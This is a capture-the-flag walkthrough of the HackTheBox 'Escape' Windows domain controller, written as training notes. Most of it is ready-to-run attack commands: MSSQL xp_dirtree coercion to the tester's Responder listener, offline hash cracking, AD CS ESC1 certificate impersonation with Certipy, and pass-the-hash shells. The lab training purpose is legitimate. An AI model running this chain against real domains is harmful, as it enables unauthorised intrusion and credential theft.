---
tags: [HTB, Escape, Windows, ActiveDirectory, SMB, MSSQL, NTLMv2, Responder, WinRM, ADCS, ESC1, PassTheHash, Medium]
platform: HackTheBox
os: Windows Server 2019
hostname: DC
difficulty: Medium
ip: $BoxIP
status: Complete
domain: $Domain
---

# HTB: Escape, Full Walkthrough

## The gist

Escape is a Windows Server 2019 domain controller in the `sequel.htb` domain. The first useful clue was not a network exploit. Anonymous SMB access exposed a public PDF containing MSSQL credentials. The SQL account was deliberately low privilege: it could authenticate to MSSQL, but it could not use `xp_cmdshell` or act as `sysadmin`.

The useful SQL feature was `xp_dirtree`. By making MSSQL resolve a UNC path owned by the testing host, the SQL service account authenticated outbound to an SMB listener. Responder captured a Net-NTLMv2 response, which was cracked offline. That supplied WinRM access as `sql_svc`.

The first shell did not immediately expose the next credential. A nonstandard SQL error-log backup was readable from `C:\SQLServer\Logs\ERRORLOG.BAK`. The file was UTF-16LE and contained a failed Ryan.Cooper logon followed by a typo in which the intended password had been entered as the username. That private credential pivoted to Ryan.Cooper.

Ryan's domain account could enroll in the vulnerable `UserAuthentication` certificate template. The template allowed the enrollee to supply the subject and supported client authentication, so a certificate for the Administrator UPN could be requested. The resulting certificate was authenticated with Certipy, the Administrator NT hash was recovered privately, and pass-the-hash produced the final privileged shell.

The important lesson is that each transition was evidence-driven. SMB disclosed the database clue, MSSQL disclosed the service-account authentication, the error-log typo disclosed the user credential, and AD CS disclosed the final impersonation boundary.

## Box information

| Item | Value |
|---|---|
| Platform | HackTheBox |
| OS | Windows Server 2019 |
| Hostname | DC |
| Domain | `$Domain` |
| Difficulty | Medium |
| IP | `$BoxIP` |
| Initial access | Anonymous SMB share and exposed PDF |
| User path | SQL service account, then Ryan.Cooper over WinRM |
| Privilege path | AD CS ESC1 certificate impersonation, then pass-the-hash |
| Metasploit | Not used |

## Vulnerability summary

| # | Finding | Evidence |
|---|---|---|
| 1 | Anonymous SMB read access | The `Public` share was readable without credentials |
| 2 | Sensitive data exposure | `SQL Server Procedures.pdf` contained MSSQL credentials |
| 3 | MSSQL service-account coercion | `xp_dirtree` triggered outbound SMB authentication |
| 4 | Weak credential hygiene | A readable SQL error-log backup contained a username-field password typo |
| 5 | AD CS ESC1 | `UserAuthentication` allowed enrollee-supplied subject and client authentication |
| 6 | NTLM hash reuse | The Administrator certificate authentication returned an NT hash suitable for pass-the-hash |

## Evidence and loot

The private evidence source is `$BoxDir`, which maps to `/home/kali/Platforms/HackTheBox/Escape`. The source contains the completed transcript, Nmap output, the PDF, captured authentication material, certificate artifacts, private credentials, hashes, flags, and screenshots. No PNG files are embedded or copied into this write-up vault.

Keep these artifacts private and mode `600` or stricter:

| Artifact | Use |
|---|---|
| `$BoxDir/Escape.log` | Full command transcript and failed attempts |
| `$BoxDir/nmap/` | Full-port and service enumeration evidence |
| `$BoxDir/loot/SQL Server Procedures.pdf` | Original anonymous SMB document |
| `$BoxDir/loot/` | Credentials, captured Net-NTLMv2 material, certificate, hashes, and flags |
| `$BoxDir/screenshots/` | Private visual evidence, not vault attachments |

The source post-box brief is `$BoxDir/notes/codex-brief.md`. It records the final route and the Certipy version-specific clock workaround.

## Variables

Use variables for every box-specific value. Do not paste private values into shared notes or screenshots.

```bash
boxset BoxName Escape
boxset BoxIP $BoxIP
boxset LocalIP $LocalIP
boxset BoxDir /home/kali/Platforms/HackTheBox/Escape
boxset Domain sequel.htb
boxset FQDN dc.sequel.htb
boxset SQLUser sql_svc
boxset SQLPassword $SQLPassword
boxset PublicUser PublicUser
boxset PublicPassword $PublicPassword
boxset RyanUser Ryan.Cooper
boxset RyanPassword $RyanPassword
boxset AdminUser Administrator
boxset AdminHash $AdminHash
boxset MssqlPort 1433
boxset WinRMPort 5985
boxset SMBPort 445
boxset Template UserAuthentication
boxset CAName sequel-DC-CA
boxset PfxFile $BoxDir/loot/administrator.pfx
boxset Wordlist /usr/share/wordlists/rockyou.txt
boxset CoerceShare share
boxset FakeTime "+8h"
```

## 1. Prepare the workspace and logging

The completed run used the standard box workspace and transcript. The raw log is the authority for command order, output, and failed attempts. Keep the reusable write-up commands separate from secret-bearing output.

```bash
boxstart $BoxName $BoxIP htb
htblog
mkdir -p "$BoxDir"/{nmap,loot,notes,exploits,screenshots}
chmod 700 "$BoxDir/loot" "$BoxDir/notes" "$BoxDir/screenshots"
```

Record the domain controller names locally. Do not assume the short hostname is enough for Kerberos or certificate tooling.

```bash
printf '%s\n' "$BoxIP $FQDN $Domain" | sudo tee -a /etc/hosts
```

> [!warning] Source and target workspace boundary
> The post-box write-up uses `$BoxDir` as the source of evidence. During a live run, use the current temporary workspace created by `boxstart`, then copy only sanitized methodology into the vault.

## 2. Full TCP enumeration

The first scan covered all TCP ports. The target presented a classic domain-controller service set plus MSSQL and WinRM, so a short top-port scan would have risked missing an important path.

```bash
sudo nmap -Pn -n -p- --min-rate 5000 \
  -oA "$BoxDir/nmap/allports" "$BoxIP"
```

The full scan found DNS, Kerberos, RPC, LDAP, SMB, MSSQL, WinRM, and AD Web Services. The exact open ports were retained in `$BoxDir/nmap/allports.*`.

SCREENSHOT: Capture the complete TCP scan and the port list.

## 3. Service, domain, and clock triage

Run version and default-script detection against the discovered ports. The service scan identifies the Windows domain context and confirms the database service before any authentication attempt.

```bash
boxset Ports "53,88,135,389,445,1433,5985,9389"
sudo nmap -Pn -n -sC -sV -p "$Ports" \
  -oA "$BoxDir/nmap/services" "$BoxIP"
```

The scan identified the domain as `$Domain` and the domain controller as `$FQDN`. MSSQL listened on `$MssqlPort` and WinRM on `$WinRMPort`.

Measure the domain-controller time before using Kerberos or Certipy. This host had an approximately eight-hour offset from the Kali system.

```bash
sudo ntpdate -q "$BoxIP" | tee "$BoxDir/loot/ntp-query.txt"
ntpdig -p 1 "$BoxIP" | tee "$BoxDir/loot/ntpdig.txt"
```

The `ntpdate` query and the Nmap clock result were useful diagnostics, but changing the local clock was not a durable fix for the later certificate operation. The successful authentication used `faketime`, documented in section 13.

> [!warning] Clock-skew gotcha
> A successful `ntpdate` command does not guarantee that the offset stays corrected. When the target or VPN path restores the old time, wrap only the Kerberos or Certipy command with `faketime -f "$FakeTime"`. Avoid changing the system clock unless the route requires it.

SCREENSHOT: Capture the service scan and clock-skew evidence.

## 4. Anonymous SMB enumeration

The service set made SMB the cheapest next test. First list shares anonymously, then connect to each readable share and download the evidence into private loot.

```bash
smbclient -L "//$BoxIP" -N
```

The `Public` share allowed anonymous read access.

```bash
mkdir -p "$BoxDir/loot/smb-public"
smbclient "//$BoxIP/Public" -N \
  -c "lcd $BoxDir/loot/smb-public; recurse ON; prompt OFF; mget *"
find "$BoxDir/loot/smb-public" -type f -printf '%p\n'
```

The file `SQL Server Procedures.pdf` was the useful artifact. An anonymous share with one readable document is still a complete credential discovery path, even when RPC and LDAP anonymous enumeration return little or nothing.

SCREENSHOT: Capture the anonymous share listing and the PDF filename.

## 5. Triage the PDF offline

Preserve the original file, inspect its metadata, and extract text offline. Do not print the extracted credential into the shared transcript.

```bash
boxset PdfFile "$BoxDir/loot/smb-public/SQL Server Procedures.pdf"
file "$PdfFile"
pdfinfo "$PdfFile" > "$BoxDir/loot/sql-procedures.pdfinfo.txt"
pdftotext -layout "$PdfFile" "$BoxDir/loot/sql-procedures.txt"
chmod 600 "$BoxDir/loot/sql-procedures.txt" "$BoxDir/loot/sql-procedures.pdfinfo.txt"
```

The document contained a SQL login named `$PublicUser` and its password. Store the password in `$PublicPassword` only in the private credential workflow. The account was a SQL-authentication account, not a Windows domain account.

> [!tip] Credential boundary
> A document can contain credentials for a different authentication plane. Preserve the source account label, test SQL authentication first, and do not assume the same value is valid for SMB, WinRM, or a domain logon.

## 6. Validate MSSQL access and privilege level

Connect with the SQL login. Do not add `-windows-auth`; that would test a different authentication mechanism and produce a misleading failure.

```bash
mssqlclient.py "$Domain/$PublicUser:$PublicPassword@$BoxIP" \
  -port "$MssqlPort"
```

Inside the MSSQL client, check the role before attempting operating-system execution.

```sql
SELECT SYSTEM_USER;
SELECT IS_SRVROLEMEMBER('sysadmin');
```

The login was valid but was not a sysadmin. A direct `xp_cmdshell` test was denied:

```sql
EXEC master..xp_cmdshell 'whoami';
```

This was an important negative result. It ruled out the usual direct MSSQL-to-Windows shell path, but it did not rule out other extended stored procedures.

## 7. Coerce the SQL service account with `xp_dirtree`

`xp_dirtree` enumerates a directory path. If the path is a UNC share on the testing host, Windows resolves it over SMB and the MSSQL service account automatically attempts NTLM authentication. The captured material is a Net-NTLMv2 challenge-response, not a reusable NT hash.

Start the listener before triggering the SQL request.

```bash
sudo responder -I tun0 -wv
```

At the MSSQL prompt, use a UNC path to the testing host. In the code block, `$LocalIP` is the value held in the local variable and must be substituted into the SQL string at the prompt.

```sql
EXEC master..xp_dirtree '\\$LocalIP\$CoerceShare', 1, 1;
```

The `1, 1` arguments request shallow traversal and file inclusion. The listing result is not important. The SMB authentication attempt is the evidence that matters.

Save the captured response privately, with no copy of the full line in the vault.

```bash
cp "$HOME/.responder/logs/SMB-$LocalIP.txt" \
  "$BoxDir/loot/sql-svc-ntlmv2.txt"
chmod 600 "$BoxDir/loot/sql-svc-ntlmv2.txt"
```

Depending on the Responder version, the capture can be in a dated SMB log or the terminal output. Identify the correct file with:

```bash
find "$HOME/.responder/logs" -type f -printf '%TY-%Tm-%Td %TH:%TM %p\n' \
  | sort | tail
```

> [!warning] `xp_cmdshell` and `xp_dirtree` are separate controls
> A low-privilege SQL login may be unable to run `xp_cmdshell` while still being able to invoke `xp_dirtree`. Treat each extended procedure as its own testable capability.

SCREENSHOT: Capture the Responder event showing the SQL service account authentication without exposing the response in the vault.

## 8. Crack the Net-NTLMv2 response offline

Crack the captured response with John and a local wordlist. This is an offline operation. The cracked password remains private.

```bash
john --wordlist="$Wordlist" "$BoxDir/loot/sql-svc-ntlmv2.txt" \
  > "$BoxDir/loot/sql-svc-john.log"
john --show "$BoxDir/loot/sql-svc-ntlmv2.txt" \
  > "$BoxDir/loot/sql-svc-cracked.txt"
chmod 600 "$BoxDir/loot/sql-svc-john.log" "$BoxDir/loot/sql-svc-cracked.txt"
```

The response cracked to the password for `$SQLUser`. The important mapping is:

```text
captured identity -> $SQLUser -> private cracked password -> WinRM validation
```

Do not confuse Net-NTLMv2 with an NTLM hash. Net-NTLMv2 must be cracked or relayed. It cannot be passed directly to SMB or WinRM as `$AdminHash` would be later.

## 9. Validate the SQL service account and open WinRM

Test the cracked credential against the services that can provide the next step. Stop after the useful hit rather than spraying it across every account.

```bash
netexec smb "$BoxIP" -u "$SQLUser" -p "$SQLPassword" -d "$Domain"
netexec winrm "$BoxIP" -u "$SQLUser" -p "$SQLPassword" -d "$Domain"
```

Open a WinRM shell and prove the identity.

```bash
evil-winrm -i "$BoxIP" -u "$SQLUser" -p "$SQLPassword"
```

```powershell
whoami
hostname
whoami /groups
whoami /priv
```

The shell was `sql_svc` on the domain controller. The account was not an administrator, so the correct next action was local credential search rather than blind token exploitation.

SCREENSHOT: Capture the WinRM login, `whoami`, hostname, and group output.

## 10. Search for nonstandard local credential stores

Start with the normal SQL Server log path, then search for backups and alternate directories. The unusual filename and location were the clue. A recursive search is useful when permissions permit it, but searching likely roots first gives faster feedback.

```powershell
Get-ChildItem -Path C:\SQLServer,C:\ProgramData,C:\Users -Recurse -Force \
  -ErrorAction SilentlyContinue -File |
  Where-Object { $_.Name -match 'ERRORLOG|\.bak$|config|backup' } |
  Select-Object FullName,Length,LastWriteTime
```

The readable file was:

```text
C:\SQLServer\Logs\ERRORLOG.BAK
```

Read it with the correct encoding. PowerShell's `-Encoding Unicode` means UTF-16LE for this file.

```powershell
Get-Content -LiteralPath 'C:\SQLServer\Logs\ERRORLOG.BAK' -Encoding Unicode
```

For a private local copy, use the Evil-WinRM download function and retain the raw file under loot:

```text
download C:\SQLServer\Logs\ERRORLOG.BAK
```

Then inspect it on Kali:

```bash
file "$BoxDir/loot/ERRORLOG.BAK"
iconv -f UTF-16LE -t UTF-8 "$BoxDir/loot/ERRORLOG.BAK" \
  > "$BoxDir/loot/ERRORLOG.utf8.txt"
chmod 600 "$BoxDir/loot/ERRORLOG.BAK" "$BoxDir/loot/ERRORLOG.utf8.txt"
```

## 11. Interpret the ERRORLOG.BAK typo leak

The backup contained a failed logon for `sequel.htb\Ryan.Cooper`. A later entry showed the password accidentally entered into the username field. This was not a normal password file. It was a credential exposed by an operator error recorded in an old log.

The sanitized evidence chain is:

```text
readable UTF-16LE backup
        -> failed logon names $RyanUser
        -> username-field typo supplies $RyanPassword privately
        -> validate the pair over WinRM
```

Do not paste the typo line, the password, or a raw `Select-String` result into a shared terminal capture. If filtering the local copy, save the result to private loot:

```bash
grep -Ein 'logon failed|Ryan|username' \
  "$BoxDir/loot/ERRORLOG.utf8.txt" \
  > "$BoxDir/loot/ERRORLOG-relevant.txt"
chmod 600 "$BoxDir/loot/ERRORLOG-relevant.txt"
```

> [!warning] Credential-hunting gotcha
> The standard SQL log path was not the useful file, and the useful backup used UTF-16LE. A file that appears empty or unreadable in a default shell may simply need the correct encoding. Search for alternate backups and inspect the surrounding context of authentication failures.

## 12. Move laterally to Ryan.Cooper

Validate the recovered user credential once over WinRM. This is a lateral move to a real domain user, not privilege escalation by itself.

```bash
netexec winrm "$BoxIP" -u "$RyanUser" -p "$RyanPassword" -d "$Domain"
evil-winrm -i "$BoxIP" -u "$RyanUser" -p "$RyanPassword"
```

Prove the new identity and privately read the user flag from the target desktop.

```powershell
whoami
hostname
type 'C:\Users\Ryan.Cooper\Desktop\user.txt'
```

The flag value belongs only in `$BoxDir/loot/flags.txt`. The vault records the path and proof identity, not the value.

SCREENSHOT: Capture the Ryan.Cooper shell and user proof without copying the flag value into the vault.

## 13. Enumerate AD CS and identify ESC1

The Ryan account had enough directory access to enumerate certificate templates. Run Certipy from Kali with the domain user credential.

```bash
certipy find -u "$RyanUser@$Domain" -p "$RyanPassword" \
  -dc-ip "$BoxIP" -vulnerable -stdout \
  > "$BoxDir/loot/certipy-vulnerable.txt"
chmod 600 "$BoxDir/loot/certipy-vulnerable.txt"
```

The vulnerable template was `$Template`. The relevant properties were:

| Property | Observed condition | Impact |
|---|---|---|
| Enrollee Supplies Subject | Enabled | The requester can choose the certificate subject or UPN |
| Client Authentication | Enabled | The certificate can authenticate as a Windows principal |
| Enrollment rights | Domain Users | `$RyanUser` can request the certificate |
| Template | `$Template` | The template is the ESC1 abuse path |

The combination matters. An enrollee-supplied subject alone is not enough. The template also needs an authentication-capable EKU and enrollment access for the current principal.

## 14. Request a certificate for the Administrator UPN

Request a certificate using the vulnerable template, while leaving the certificate output in private loot. The requested subject is the Administrator UPN, not Ryan's own UPN.

```bash
cd "$BoxDir/loot"
certipy req -u "$RyanUser@$Domain" -p "$RyanPassword" \
  -dc-ip "$BoxIP" -ca "$CAName" -template "$Template" \
  -upn "$AdminUser@$Domain" \
  > "$BoxDir/loot/certipy-request.txt"
chmod 600 "$BoxDir/loot/certipy-request.txt" "$PfxFile"
```

The resulting PKCS#12 file is an authentication credential. Protect it like a password. Do not upload it to the vault or place it in a shared screenshot.

> [!warning] ESC1 decision point
> Do not request an Administrator certificate merely because AD CS exists. Confirm all three conditions first: the template allows the enrollee to supply the subject, the certificate supports client authentication, and the current account can enroll.

## 15. Authenticate the certificate with the clock workaround

The target's clock was ahead by approximately eight hours. Certipy authentication initially failed with a Kerberos clock-skew error. `sudo ntpdate` did not provide a durable solution because the offset returned. Certipy v5 also did not support the older `-output` option used in some guides.

Run only the Certipy authentication under `faketime`:

```bash
faketime -f "$FakeTime" certipy auth \
  -pfx "$PfxFile" -dc-ip "$BoxIP" \
  > "$BoxDir/loot/certipy-auth.txt"
chmod 600 "$BoxDir/loot/certipy-auth.txt"
```

Certipy authentication returned the Administrator NT hash. Keep it in `$AdminHash` and private loot. Do not copy the output line into the vault.

> [!warning] Certipy version gotcha
> On the installed Certipy v5 route, redirect stdout to private loot instead of relying on `-output`. Check `certipy auth --help` on the current Kali image before copying syntax from an older walkthrough.

## 16. Validate pass-the-hash and open the Administrator shell

The certificate and the NT hash are different credentials. The certificate proves the AD CS impersonation; the NT hash enables pass-the-hash. Validate the hash against SMB before opening a shell.

```bash
netexec smb "$BoxIP" -u "$AdminUser" -H "$AdminHash" -d "$Domain"
```

Use WinRM when it is available:

```bash
evil-winrm -i "$BoxIP" -u "$AdminUser" -H "$AdminHash"
```

If WinRM is unavailable but SMB administrative access succeeds, use an Impacket service shell:

```bash
impacket-psexec -hashes ":$AdminHash" \
  "$Domain/$AdminUser@$BoxIP"
```

Prove the final identity and privately read the root flag.

```powershell
whoami
hostname
type 'C:\Users\Administrator\Desktop\root.txt'
```

The root flag value belongs only in `$BoxDir/loot/flags.txt`. Do not place it in this write-up, the command appendix, the handoff, or a shared screenshot.

SCREENSHOT: Capture `whoami`, the hostname, and the root proof in the private evidence workspace.

## 17. Decision points and failed routes

### MSSQL `xp_cmdshell` was denied

This was a useful result, not a dead end. The SQL login was authenticated but not sysadmin. The next test changed feature class from OS command execution to an extended procedure that causes network authentication.

### SQL authentication and Windows authentication are different

The PDF credentials were for MSSQL SQL authentication. Testing the same pair with `-windows-auth` would have tested domain authentication and obscured the real result.

### The normal SQL error-log path was not readable

The standard path was protected for the current account. The accessible backup used a custom path and a misleading `.BAK` suffix. Search for alternate application and service log roots, not only the vendor default.

### The backup looked unreadable until decoded correctly

`ERRORLOG.BAK` was UTF-16LE. Use PowerShell `-Encoding Unicode`, `file`, or `iconv` before deciding that the file has no useful text.

### Clock correction did not hold

Changing the system time was not a durable answer for the Certipy operation. The repeatable solution was `faketime -f "$FakeTime"` around the authentication command.

### AD CS was not automatically a privilege path

The vulnerable template needed all ESC1 conditions: subject control, client authentication, and enrollment permission. Certipy's vulnerable-template output made the decision explicit.

## 18. RUNBOOK V2 stages used

- [[OSCP/RUNBOOK V2/Start Here|Start Here]]
- [[OSCP/RUNBOOK V2/Port Triage|Port Triage]]
- [[OSCP/RUNBOOK V2/AD - Service Scan|AD Service Scan]]
- [[OSCP/RUNBOOK V2/AD - Clock Sync|AD Clock Sync]]
- [[OSCP/RUNBOOK V2/AD - Anonymous Enum|AD Anonymous Enum]]
- [[OSCP/RUNBOOK V2/Windows - SMB Enum|Windows SMB Enum]]
- [[OSCP/RUNBOOK V2/AD - Credential Validation|AD Credential Validation]]
- [[OSCP/RUNBOOK V2/AD - WinRM Foothold|AD WinRM Foothold]]
- [[OSCP/RUNBOOK V2/Windows - Credential Search|Windows Credential Search]]
- [[OSCP/RUNBOOK V2/AD - Certificate Services ESC1|AD Certificate Services ESC1]]
- [[OSCP/RUNBOOK V2/AD - Pass the Hash|AD Pass the Hash]]
- [[OSCP/RUNBOOK V2/AD - Clean Down|AD Clean Down]]

## Attack chain

```text
Anonymous SMB
    -> Public share
    -> SQL Server Procedures.pdf
    -> MSSQL SQL authentication as $PublicUser
    -> xp_dirtree UNC coercion
    -> Responder captures Net-NTLMv2 for $SQLUser
    -> John cracks the response offline
    -> WinRM as $SQLUser
    -> UTF-16LE C:\SQLServer\Logs\ERRORLOG.BAK
    -> username-field typo exposes $RyanUser credential privately
    -> WinRM as $RyanUser
    -> Certipy identifies ESC1 on $Template
    -> certificate requested for $AdminUser UPN
    -> Certipy authentication under faketime returns $AdminHash
    -> pass-the-hash
    -> Administrator
```

## Credentials

| Identity | Source | Validated use |
|---|---|---|
| `$PublicUser` | Anonymous PDF | MSSQL SQL authentication |
| `$SQLUser` | Responder capture cracked offline | WinRM foothold |
| `$RyanUser` | Typo in readable SQL error-log backup | WinRM and AD CS enumeration |
| `$AdminUser` | Certificate impersonation and returned NT hash | SMB and WinRM pass-the-hash |

The values for `$PublicPassword`, `$SQLPassword`, `$RyanPassword`, and `$AdminHash` remain in private loot only.

## Flags

| Flag | Path | Storage |
|---|---|---|
| User | `C:\Users\Ryan.Cooper\Desktop\user.txt` | `$BoxDir/loot/flags.txt` only |
| Root | `C:\Users\Administrator\Desktop\root.txt` | `$BoxDir/loot/flags.txt` only |

## Key lessons

- Anonymous SMB is a data-discovery problem even when the share contains only one file. Download and triage every readable document.
- A SQL login that cannot use `xp_cmdshell` may still invoke `xp_dirtree`. Test adjacent server features instead of treating one denied procedure as the end of the database branch.
- UNC paths create implicit Windows authentication. A database service account can disclose a crackable Net-NTLMv2 response without executing a command on the target.
- Net-NTLMv2 capture, NTLM hash, certificate, and password are different evidence types. Keep their sources and allowed uses distinct.
- Service logs and backups often contain more than service configuration. A failed authentication event can reveal both a real account name and an operator typo.
- Encoding is part of file triage. UTF-16LE data can look empty or malformed if decoded as UTF-8.
- A credential discovered in an error log should be validated against the service named by the evidence, then against the next plausible service. Avoid broad spraying.
- AD CS is only exploitable when template properties, enrollment rights, and authentication EKUs align. `certipy find -vulnerable` is the decision point, not the conclusion by itself.
- Certificate authentication depends on Kerberos time. If the target clock remains offset, a scoped `faketime` wrapper is often more repeatable than changing the workstation clock.
- Certipy syntax changes between versions. Read local help and redirect sensitive output privately rather than copying stale `-output` examples.
- A certificate can be the route to an NT hash, while pass-the-hash is the later remote-authentication technique. Explain both boundaries separately.
- Keep flags and screenshots in the box workspace. The vault should contain paths, identities, evidence descriptions, and repeatable commands with variables.

## Related boxes

- [[OSCP/BOXES/WRITE UPS/AD/Search|Search]] -- certificate-authenticated access, AD credential chaining, and delegated directory rights
- [[OSCP/BOXES/WRITE UPS/AD/Vintage|Vintage]] -- Kerberos-aware validation, gMSA credentials, ACL reasoning, and delegated movement
- [[OSCP/BOXES/WRITE UPS/AD/Forest|Forest]] -- domain enumeration, Kerberos abuse, and privileged hash recovery
- [[OSCP/BOXES/WRITE UPS/AD/RockyColt|RockyColt]] -- anonymous AD enumeration, ACL abuse, and Kerberos-based lateral movement
- [[OSCP/BOXES/WRITE UPS/AD/Blackfield|Blackfield]] -- anonymous SMB discovery, offline credential recovery, and pass-the-hash
- [[OSCP/BOXES/WRITE UPS/Windows/Grandpa|Grandpa]] -- legacy IIS exploitation, process stability, and Windows privilege escalation

## External resources

- [Certipy](https://github.com/ly4k/Certipy) for AD CS enumeration and certificate operations
- [HackTricks AD CS methodology](https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/ad-certificates.html)
- [Impacket](https://github.com/fortra/impacket) for MSSQL, SMB, and Windows remote execution clients
- [Responder](https://github.com/lgandx/Responder) for authorized NTLM challenge-response capture
- [John the Ripper](https://www.openwall.com/john/) for offline password recovery
- [ippsec.rocks Escape search](https://ippsec.rocks/?q=Escape)

## Closeout checklist

- [x] Full TCP scan saved under `$BoxDir/nmap/`
- [x] Service and domain scan saved under `$BoxDir/nmap/`
- [x] Anonymous SMB share and PDF preserved in private loot
- [x] MSSQL authentication and denied `xp_cmdshell` recorded
- [x] `xp_dirtree` coercion and Net-NTLMv2 capture recorded privately
- [x] Offline cracking output stored privately
- [x] WinRM identity proofs recorded
- [x] UTF-16LE `ERRORLOG.BAK` recovered and decoded privately
- [x] Ryan.Cooper credential pivot recorded without the value
- [x] AD CS template properties and ESC1 decision recorded
- [x] Certificate request and clock-skew workaround recorded privately
- [x] Administrator hash and pass-the-hash validation recorded privately
- [x] Both flag paths recorded, with values retained only in loot
- [x] Source screenshots retained outside the vault, with no PNG embeds
- [x] No Metasploit used
- [x] [[OSCP/RUNBOOK V2/AD - Clean Down|AD Clean Down]] reviewed before closing the box

## Why this matters for OSCP

Escape rewards disciplined evidence handling. The route crosses anonymous SMB, database authentication, outbound NTLM, offline cracking, Windows remote management, local file triage, AD CS, Kerberos time validation, and pass-the-hash. None of those steps is sufficient in isolation. The exam-relevant skill is recognizing when a negative result changes the branch, preserving the clue that justifies the next test, and keeping each credential type inside its correct authentication boundary.
